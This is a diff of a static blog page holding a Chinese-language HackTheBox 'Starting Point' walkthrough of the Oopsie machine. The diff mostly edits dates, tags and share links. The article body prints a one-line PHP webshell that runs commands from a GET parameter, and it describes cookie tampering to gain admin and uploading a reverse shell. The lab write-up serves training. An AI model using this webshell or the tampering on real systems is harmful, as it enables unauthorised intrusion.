@@ -6,17 +6,13 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="OopsieEnumeration用 Burp Suite 看有沒有login相關路徑Login as Guestuploads 可能有攻擊面但需要admin看來要透過改cookie取得adminid&#x3D;2 &#x3D;&gt; 1 Foothold上傳webshellshell.php 1&lt;?php system($_GET[&#x27;cmd&#x27;].&#x27;; ec">
+    <meta name="description" content="OopsieEnumeration用 Burp Suite 看有沒有login相關路徑Login as Guestuploads 可能有攻擊面但需要admin看來要透過改cookie取得adminid&#x3D;2 &#x3D;&gt; 1 Foothold上傳webshellshell.php 1&lt;?php system($_GET[&#x27;cmd&#x27;].&#x27;; ech">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HTB Starting Point (Linux)">
-<meta property="og:url" content="http://example.com/2025/05/02/HTB-Starting-Point-Linux/index.html">
+<meta property="og:url" content="http://example.com/2025/01/01/HTB-Starting-Point-Linux/index.html">
 <meta property="og:site_name" content="wang&#39;s blog">
-<meta property="og:description" content="OopsieEnumeration用 Burp Suite 看有沒有login相關路徑Login as Guestuploads 可能有攻擊面但需要admin看來要透過改cookie取得adminid&#x3D;2 &#x3D;&gt; 1 Foothold上傳webshellshell.php 1&lt;?php system($_GET[&#x27;cmd&#x27;].&#x27;; ec">
+<meta property="og:description" content="OopsieEnumeration用 Burp Suite 看有沒有login相關路徑Login as Guestuploads 可能有攻擊面但需要admin看來要透過改cookie取得adminid&#x3D;2 &#x3D;&gt; 1 Foothold上傳webshellshell.php 1&lt;?php system($_GET[&#x27;cmd&#x27;].&#x27;; ech">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://hackmd.io/_uploads/S1zOtj8VJl.png">
-<meta property="og:image" content="https://hackmd.io/_uploads/Bk_0FoU4Je.png">
-<meta property="og:image" content="https://hackmd.io/_uploads/r1gL9s8V1g.png">
-<meta property="og:image" content="https://hackmd.io/_uploads/HkId9sIEyx.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/HyKCaJoEJl.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/BJ_wgeoVye.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/SkqgDyC4Jl.png">
@@ -80,11 +76,13 @@
 <meta property="og:image" content="https://hackmd.io/_uploads/H1aiBW_rJg.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/B1rHU-_HJe.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/By3PI-_BJl.png">
-<meta property="article:published_time" content="2025-05-02T15:38:32.000Z">
-<meta property="article:modified_time" content="2025-05-02T15:44:33.927Z">
+<meta property="article:published_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-02T15:55:09.747Z">
 <meta property="article:author" content="wang">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="HackTheBox">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://hackmd.io/_uploads/S1zOtj8VJl.png">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/HyKCaJoEJl.png">
     
     
     <!-- title -->
@@ -143,10 +141,10 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/2025/05/02/test/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/02/HTB-Cap/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2025/05/02/SunshineCTF-2024-WriteUp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2024/12/31/HTB-Starting-Point-Windows/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -159,17 +157,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/02/HTB-Starting-Point-Linux/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&text=HTB Starting Point (Linux)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&is_video=false&description=HTB Starting Point (Linux)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=HTB Starting Point (Linux)&body=Check out this article: http://example.com/2025/05/02/HTB-Starting-Point-Linux/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&name=HTB Starting Point (Linux)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&t=HTB Starting Point (Linux)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/01/HTB-Starting-Point-Linux/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&text=HTB Starting Point (Linux)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&is_video=false&description=HTB Starting Point (Linux)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Starting Point (Linux)&body=Check out this article: http://example.com/2025/01/01/HTB-Starting-Point-Linux/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&name=HTB Starting Point (Linux)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&t=HTB Starting Point (Linux)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -201,7 +199,7 @@
       
     <div class="postdate">
       
-        <time datetime="2025-05-02T15:38:32.000Z" class="dt-published" itemprop="datePublished">2025-05-02</time>
+        <time datetime="2024-12-31T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-01-01</time>
         
       
     </div>
@@ -210,14 +208,18 @@
       
 
       
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>
+    </div>
+
 
     </div>
   </header>
   
 
   <div class="content e-content" itemprop="articleBody">
-    <p><img src="https://hackmd.io/_uploads/S1zOtj8VJl.png" alt="image"><br><img src="https://hackmd.io/_uploads/Bk_0FoU4Je.png" alt="image"><br><img src="https://hackmd.io/_uploads/r1gL9s8V1g.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkId9sIEyx.png" alt="image"></p>
-<h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p><img src="https://hackmd.io/_uploads/HyKCaJoEJl.png" alt="image"><br><img src="https://hackmd.io/_uploads/BJ_wgeoVye.png" alt="image"><br>用 Burp Suite 看有沒有login相關路徑<br><img src="https://hackmd.io/_uploads/SkqgDyC4Jl.png" alt="image"><br><img src="https://hackmd.io/_uploads/S1AND1RNJe.png" alt="image"><br>Login as Guest<br>uploads 可能有攻擊面但需要admin<br><img src="https://hackmd.io/_uploads/Sy2d5yRNJl.png" alt="image"><br>看來要透過改cookie取得admin<br><img src="https://hackmd.io/_uploads/Sy_69kRVJl.png" alt="image"><br>id&#x3D;2 &#x3D;&gt; 1<br><img src="https://hackmd.io/_uploads/BkKmokRVye.png" alt="image"><br><img src="https://hackmd.io/_uploads/HyQQJxRNye.png" alt="image"></p>
+    <h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p><img src="https://hackmd.io/_uploads/HyKCaJoEJl.png" alt="image"><br><img src="https://hackmd.io/_uploads/BJ_wgeoVye.png" alt="image"><br>用 Burp Suite 看有沒有login相關路徑<br><img src="https://hackmd.io/_uploads/SkqgDyC4Jl.png" alt="image"><br><img src="https://hackmd.io/_uploads/S1AND1RNJe.png" alt="image"><br>Login as Guest<br>uploads 可能有攻擊面但需要admin<br><img src="https://hackmd.io/_uploads/Sy2d5yRNJl.png" alt="image"><br>看來要透過改cookie取得admin<br><img src="https://hackmd.io/_uploads/Sy_69kRVJl.png" alt="image"><br>id&#x3D;2 &#x3D;&gt; 1<br><img src="https://hackmd.io/_uploads/BkKmokRVye.png" alt="image"><br><img src="https://hackmd.io/_uploads/HyQQJxRNye.png" alt="image"></p>
 <h3 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h3><p>上傳webshell<br><img src="https://hackmd.io/_uploads/HJWXZeAVyl.png" alt="image"><br><code>shell.php</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&#x27;; echo meow&#x27;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>猜路徑 &#x2F;uploads<br><img src="https://hackmd.io/_uploads/H1ssgl0Vyx.png" alt="image"><br><img src="https://hackmd.io/_uploads/B1ucWe0Vyg.png" alt="image"><br>上傳 reverse shell</p>
@@ -330,17 +332,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/02/HTB-Starting-Point-Linux/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&text=HTB Starting Point (Linux)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&is_video=false&description=HTB Starting Point (Linux)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=HTB Starting Point (Linux)&body=Check out this article: http://example.com/2025/05/02/HTB-Starting-Point-Linux/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&name=HTB Starting Point (Linux)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&t=HTB Starting Point (Linux)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/01/HTB-Starting-Point-Linux/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&text=HTB Starting Point (Linux)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&is_video=false&description=HTB Starting Point (Linux)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Starting Point (Linux)&body=Check out this article: http://example.com/2025/01/01/HTB-Starting-Point-Linux/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&name=HTB Starting Point (Linux)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/01/HTB-Starting-Point-Linux/&t=HTB Starting Point (Linux)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
